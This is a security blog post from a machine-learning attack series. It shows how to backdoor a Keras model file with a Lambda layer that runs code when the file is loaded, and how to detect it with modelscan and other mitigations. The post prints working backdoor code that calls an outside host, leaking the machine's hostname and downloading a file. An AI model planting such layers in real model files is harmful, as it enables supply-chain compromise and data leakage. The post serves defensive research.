<!DOCTYPE html>
<html lang="en-us">
<head prefix="og: http://ogp.me/ns#">
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
  <meta property="og:title" content=" Machine Learning Attack Series: Backdooring Keras Models and How to Detect It &middot;  Embrace The Red" />
  
  <meta property="og:site_name" content="Embrace The Red" />
  <meta property="og:url" content="https://embracethered.com/blog/posts/2024/machine-learning-attack-series-keras-backdoor-model/" />
  
  
  <meta property="og:type" content="article" />
  
  <meta property="og:article:published_time" content="2024-05-18T16:00:00-07:00" />
  
  <meta property="og:article:tag" content="ai" />
  
  <meta property="og:article:tag" content="testing" />
  
  <meta property="og:article:tag" content="machine learning" />
  
  <meta property="og:article:tag" content="red teaming" />
  
  <meta property="og:article:tag" content="huskyai" />
  
  

  <title>
     Machine Learning Attack Series: Backdooring Keras Models and How to Detect It &middot;  Embrace The Red
  </title>

  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
  
  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
  <link rel="shortcut icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
  <link rel="apple-touch-icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
  

  
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@wunderwuzzi23">
<meta name="twitter:title" content="Machine Learning Attack Series: Backdooring Keras model files and how to detect it">
<meta name="twitter:description" content="Adversaries leverage supply chain attacks to gain footholds. When it comes to machine learning we have to worry about deserialization attacks and how to detect them.">
<meta name="twitter:image" content="https://embracethered.com/blog/images/2024/ml-attack-series-keras.png">

<meta name="twitter:creator" content="@wunderwuzzi23">



  
</head>
<body>
    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
    <section class="header-text">
      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
      
      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
        wunderwuzzi&#39;s blog
        <br><a style="color: greenyellow; font-weight:300;text-decoration: underline; " href="https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1838828869&linkCode=as2&tag=wunderwuzzi-20&linkId=b6523e937607be47499c6010ff489537">OUT NOW: Cybersecurity Attacks - Red Team Strategies</a> 
      </div>
      
      <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  <a href="https://youtube.com/@embracethered" target="_blank">
    <i class="fa fa-youtube"></i>
  </a>
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>

      
      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
        <i class="fa fa-angle-left" aria-hidden="true"></i>
        &nbsp;Home
      </a>
      
    
      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
        <i class="fa fa-rss" aria-hidden="true"></i>
        &nbsp;Subscribe
      </a>
    </section>
  </header>
  <main class="container">


<article>
  <header>
    <h1 class="text-primary">Machine Learning Attack Series: Backdooring Keras Models and How to Detect It</h1>
    <div class="post-meta clearfix">
    
      <div class="post-date pull-left">
        Posted on
        <time datetime="2024-05-18T16:00:00-07:00">
          May 18, 2024
        </time>
      </div>
    
      <div class="pull-right">
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/ai">#ai</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/testing">#testing</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/machine-learning">#machine learning</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red-teaming">#red teaming</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/huskyai">#huskyai</a></span>
        
      </div>
    </div>
  </header>
  <section>
    <p>This post is part of a <a href="/blog/posts/2020/machine-learning-attack-series-overview/">series</a> about machine learning and artificial intelligence.</p>
<p>Adversaries often leverage supply chain attacks to gain footholds. In machine learning <strong>model deserialization issues</strong> are a significant threat, and detecting them is crucial, as they can lead to arbitrary code execution. We explored this attack with <a href="https://embracethered.com/blog/posts/2022/machine-learning-attack-series-injecting-code-pickle-files/">Python Pickle files in the past</a>.</p>
<p>In this post we are covering backdooring the original Keras <code>Husky AI</code> model from the <a href="https://embracethered.com/blog/posts/2020/machine-learning-attack-series-overview/">Machine Learning Attack Series</a>, and afterwards we investigate tooling to detect the backdoor.</p>
<p><a href="/blog/images/2024/ml-attack-series-keras.png"><img src="/blog/images/2024/ml-attack-series-keras.png" alt="Red Teaming Machine Learning - Attack Series"></a></p>
<p>The technique described is based on this post by Microsoft, named <a href="https://github.com/Azure/counterfit/wiki/Abusing-ML-model-file-formats-to-create-malware-on-AI-systems:-A-proof-of-concept">Abusing ML model file formats to create malware on AI systems</a>.</p>
<p><strong>Let&rsquo;s get started.</strong></p>
<h2 id="revisiting-husky-ai">Revisiting Husky AI</h2>
<p>The original Husky AI model is stored as an <code>.h5</code> file. You can find it <a href="https://github.com/wunderwuzzi23/huskyai">here</a>.</p>
<p>Note: If you want to follow along check out this <a href="https://github.com/wunderwuzzi23/mlattacks/blob/main/Machine_Learning_Attack_Series_Backdooring_Keras_model_files.ipynb">Notebook</a> to follow along.</p>
<pre tabindex="0"><code>git clone https://huggingface.co/wunderwuzzi/huskyai
</code></pre><p>To get started let&rsquo;s load up the original model:</p>
<pre tabindex="0"><code>import keras
model = keras.models.load_model(&#34;huskymodel.h5&#34;)
model.summary()
</code></pre><p>And do a random inference to ensure things work:</p>
<pre tabindex="0"><code>random_image = np.expand_dims(np.random.rand(128, 128, 3), axis=0)
prediction = model.predict(random_image, verbose=0)
print(&#34;Prediction output:&#34;, prediction)

Prediction output: [[0.1144329]]
</code></pre><p>Great, so things work.</p>
<p><strong>Now let&rsquo;s put ourselves into an attackers shoes.</strong></p>
<h2 id="loading-the-original-model">Loading the Original Model</h2>
<p>Assume we find the Husky AI Keras model file (in this case the <code>.h5</code>) file somewhere on a network share, where the production systems, developers and/or data scientists load it from.</p>
<p><strong>Threat</strong> =&gt; This means the attacker can perform a supply chain attack by modifying the file and add malicious instructions.</p>
<h2 id="adding-a-custom-layer">Adding a Custom Layer</h2>
<p>To add executable code, we can add a Keras lambda layer to the model architecture.</p>
<p>For the demo we:</p>
<ol>
<li>Print a &ldquo;Hello world&rdquo; message to visually demonstrate code execution and</li>
<li>Download an image from a remote server and with the same web request leak the hostname of the machine (this way malware could be downloaded to the host)</li>
</ol>
<p>The code looks like this:</p>
<pre tabindex="0"><code>temp_model = keras.models.load_model(&#34;huskymodel.h5&#34;)

def delicious_layer(x):
    print(&#34;Hello world! Husky AI is now backdoored.&#34;)

    import http.client, os
    if not os.path.exists(&#34;embracethered.png&#34;):
      conn = http.client.HTTPSConnection(&#34;wuzzi.net&#34;)
      host = os.getenv(&#34;HOSTNAME&#34;)
      conn.request(&#34;GET&#34;, f&#34;/l.png?lambdahost={host}&#34;)
      res = conn.getresponse()
      data = res.read()
      with open(&#34;embracethered.png&#34;, &#34;wb&#34;) as f:
          f.write(data)
    return x

lambda_layer = keras.layers.Lambda(delicious_layer)
temp_model.add(lambda_layer)
</code></pre><h2 id="saving-the-backdoored-model-file">Saving the Backdoored Model File</h2>
<p>Finally, we compile the model using the original settings and save it.</p>
<pre tabindex="0"><code>temp_model.compile(optimizer=model.optimizer, loss=model.loss, metrics=model.metrics)
temp_model.save(&#34;huskymodel-lambda-backdoor&#34;)
</code></pre><p>There are multiple file format options when saving the model, more about this later.</p>
<h2 id="simulating-the-attack">Simulating the Attack</h2>
<p>Now, let&rsquo;s load the backdoored model.</p>
<pre tabindex="0"><code>backdoor_model = keras.models.load_model(&#34;huskymodel-lambda-backdoor&#34;)
</code></pre><p><img src="/blog/images/2024/lambda-backdoor-load-model.png" alt="backdoor layer added "></p>
<p><strong>As you can see in the screenshot above, the <code>print</code> statement was already executed!</strong></p>
<p>Tip: If the model is <a href="https://keras.io/api/models/model_saving_apis/model_saving_and_loading/">saved as <code>.keras</code>, using the Keras v3 file format</a>, then this load would fail.</p>
<p>This is because <code>safe_mode=True</code> is the default for v3, however <code>safe_mode</code> is not considered for older model formats. Unfortunatley, saving a model the newer format is not the default. Hence remember to use the <code>.keras</code> extension and/or <code>file_format=&quot;keras&quot;</code> when saving model files.</p>
<p>Let&rsquo;s take a look at the architecture to see if we can find the additional layer:</p>
<pre tabindex="0"><code>backdoor_model.summary()
</code></pre><p>Here we go:</p>
<p><img src="/blog/images/2024/lambda-architecture-backdoor.png" alt="backdoor layer added"></p>
<p>Excellent, notice the last layer named <em>lambda_17</em>.</p>
<h2 id="checking-the-result">Checking the Result</h2>
<p>As we observed earlier already, just loading the model executed the <code>print</code> function:</p>
<pre tabindex="0"><code>Hello world! Husky AI is now backdoored.
</code></pre><p>And when listing the directory structure we see the <code>embracethered.png</code> was indeed downloaded from the remote server.</p>
<pre tabindex="0"><code>-rw-r--r-- 1 root root  34K May 13 22:40 embracethered.png
</code></pre><p>And the server log also shows the hostname that was retrieved:</p>
<p><img src="/blog/images/2024/lambda-server-log.png" alt="server log"></p>
<p><strong>Nice, but scary!</strong></p>
<h2 id="inspecting-and-identifying-backdoored-models">Inspecting and Identifying Backdoored Models</h2>
<p>If you walk through the Notebook, you can find Python code to check for hidden lambda layers and Python byte code.</p>
<p>A very practical detection you should consider is Protect AI&rsquo;s <code>ModelScan</code> <a href="https://github.com/protectai/modelscan">tool</a>.</p>
<pre tabindex="0"><code>pip install modelscan
</code></pre><p>Then you can point it to the model file:</p>
<pre tabindex="0"><code>modelscan -p huskymodel-lambda-backdoor
</code></pre><p>Observe that it indeed detected the backdoor:</p>
<p><a href="/blog/images/2024/modelscan-output.png"><img src="/blog/images/2024/modelscan-output.png" alt="modelscan output"></a></p>
<p><strong>Excellent.</strong> It&rsquo;s great to have a open source tool available to detect this (and other) issues.</p>
<p>Severity levels are defined <a href="https://github.com/protectai/modelscan/blob/main/docs/severity_levels.md">here</a>. In our specific case, arbitrary code, include a file from a remote location is downloaded, which might make it higher severity then medium. So, make sure to investigate all flagged issues to look for malicious instructions.</p>
<p><strong>Takeaway:</strong> I highly recommend integrating such tooling into your MLOps pipelines.</p>
<h2 id="mitigations-and-detections">Mitigations and Detections</h2>
<ul>
<li>Signature Validation: Use signatures and/or validate hashes of models (e.g. SHA-256 hash)</li>
<li>Audits: Ensure auditing of model files from untrusted sources</li>
<li>Scanning and CI/CD: Explore scanning tools like Protect AI&rsquo;s <a href="https://github.com/protectai/modelscan">modelscan</a></li>
<li>Isolation: Load untrusted models in isolated environments (if possible)</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>As we can see, machine learning model files should be treated like binary executables. We also discussed how backdoored model files can be detected, and tooling for MLOps integration.</p>
<p>Hope this was helpful and interesting.</p>
<p>Cheers,
Johann.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">TensorFlow models are programs</a></li>
<li><a href="https://embracethered.com/blog/posts/2020/machine-learning-attack-series-overview/">Machine Learning Attack Series - Overview</a></li>
<li><a href="https://www.youtube.com/watch?v=JzTZQGYQiKw">Red Team Village Presentation: Building and Breaking a Machine Learning System</a></li>
<li><a href="https://github.com/Azure/counterfit/wiki/Abusing-ML-model-file-formats-to-create-malware-on-AI-systems:-A-proof-of-concept">Abusing ML model file formats to create malware on AI systems</a> by Matthieu Maitre</li>
<li><a href="https://embracethered.com/blog/posts/2022/machine-learning-attack-series-injecting-code-pickle-files/">Machine Learning Attack Series: Backdooring Pickle files</a></li>
<li><a href="https://keras.io/api/models/model_saving_apis/model_saving_and_loading/">Keras Documentation - Saving and Loading Model Files</a></li>
<li><a href="https://github.com/protectai/modelscan">modelscan</a></li>
</ul>
<h2 id="appendix">Appendix</h2>
<h3 id="ml-attack-series---overview">ML Attack Series - Overview</h3>
<ul>
<li><a href="/blog/posts/2020/husky-ai-machine-learning-attack-bruteforce/">Brute forcing images to find incorrect predictions</a></li>
<li><a href="/blog/posts/2020/husky-ai-machine-learning-attack-smart-fuzz/">Smart brute forcing</a></li>
<li><a href="/blog/posts/2020/husky-ai-machine-learning-attack-perturbation-external/">Perturbations to misclassify existing images</a></li>
<li><a href="/blog/posts/2020/husky-ai-adversarial-robustness-toolbox-testing/">Adversarial Robustness Toolbox Basics</a></li>
<li><a href="/blog/posts/2020/husky-ai-image-rescaling-attacks/">Image Scaling Attacks</a></li>
<li><a href="/blog/posts/2020/husky-ai-machine-learning-model-stealing/">Stealing a model file: Attacker gains read access to the model</a></li>
<li><a href="/blog/posts/2020/husky-ai-machine-learning-backdoor-model/">Backdooring models: Attacker modifies persisted model file</a></li>
<li><a href="/blog/posts/2020/husky-ai-repudiation-threat-deny-action-machine-learning/">Repudiation Threat and Auditing: Catching modifications and unauthorized access</a></li>
<li><a href="/blog/posts/2020/cve-2020-16977-vscode-microsoft-python-extension-remote-code-execution/">Attacker modifies Jupyter Notebook file to insert a backdoor</a></li>
<li><a href="/blog/posts/2020/cve-2020-16977-vscode-microsoft-python-extension-remote-code-execution/">CVE 2020-16977: VS Code Python Extension Remote Code Execution</a></li>
<li><a href="/blog/posts/2020/machine-learning-attack-series-generative-adversarial-networks-gan/">Using Generative Adversarial Networks (GANs) to create fake husky images</a></li>
<li><a href="/blog/posts/2021/huskyai-using-azure-counterfit/">Using Microsoft Counterfit to create adversarial examples</a></li>
<li><a href="/blog/posts/2022/machine-learning-attack-series-injecting-code-pickle-files/">Backdooring Pickle Files</a></li>
<li><a href="/blog/posts/2024/machine-learning-attack-series-keras-backdoor-model/">Machine Learning Attack Series: Backdooring Keras Model Files and How to Detect It</a></li>
</ul>
<h3 id="modelscan-ouput">Modelscan Ouput</h3>
<pre tabindex="0"><code>--- Summary ---

Total Issues: 1

Total Issues By Severity:

    - LOW: 0
    - MEDIUM: 1
    - HIGH: 0
    - CRITICAL: 0

--- Issues by Severity ---

--- MEDIUM ---

Unsafe operator found:
  - Severity: MEDIUM
  - Description: Use of unsafe operator &#39;Lambda&#39; from module &#39;Keras&#39;
  - Source: /content/huskyai/models/huskymodel-lambda-backdoor/keras_metadata.pb
</code></pre><h3 id="loading-an-image">Loading an Image</h3>
<pre tabindex="0"><code>import numpy as np
import imageio
from skimage.transform import resize
import matplotlib.pyplot as plt

def load_image(name):
    image = np.array(imageio.imread(name))
    image = cv2.resize( image, (num_px, num_px))
    image = cv2.cvtColor(image, cv2.COLOR_RGBA2RGB)
   
    image = image/255.
    image = np.expand_dims(image, axis=0)
    #print(image.shape)
  
    #image_vector = image.reshape((1, num_px * num_px * 3)).T
    return image
</code></pre><h3 id="doing-a-prediction">Doing a Prediction</h3>
<pre tabindex="0"><code>import cv2 
import imageio.v2 as imageio
num_px = 128
image1 = load_image(&#34;/tmp/images/val/husky/8b80a51b86ba1ec6cd7ae9bde6a32b4b.jpg&#34;)
plt.imshow(image1[0])
model.predict(image1) 
</code></pre>
  </section>
  <footer>
    
    
    
    <footer></footer><hr/>
    
    <ul class="pager">
      
      <li class="next"><a href="https://embracethered.com/blog/posts/2024/chatgpt-hacking-memories/">Newer <span aria-hidden="true">&rarr;</span></a></li>
      
      
      <li class="author-contact">
        <a href="mailto:security@wunderwuzzi.net">
          <i class="fa fa-envelope-o" aria-hidden="true"></i>
          &nbsp;Contact me
        </a>
     </li>

      
      
      <li class="previous"><a href="https://embracethered.com/blog/posts/2024/cookie-theft-in-2024-and-what-todo/"><span aria-hidden="true">&larr;</span> Older</a></li>
      
    </ul>
  </footer>
</article>
</main>
  <footer class="container global-footer">
    <div class="copyright-note pull-left">
     
     (c) WUNDERWUZZI 2018-2025
     <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  <a href="https://youtube.com/@embracethered" target="_blank">
    <i class="fa fa-youtube"></i>
  </a>
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>
 
     <div style="font-size:small;font-style: italic;color:crimson">
    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
    </div>
    </div>
</footer>
  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
  <script>
    hljs.initHighlightingOnLoad();
  </script>
  
  



<script type="text/javascript">
  var _paq = window._paq || [];
  _paq.push(["disableCookies"]);
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//wuzzi.net/anamato/inc/";
    _paq.push(['setTrackerUrl', u+'rts.php']);
    _paq.push(['setSiteId', '1']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
  
</body>
</html>

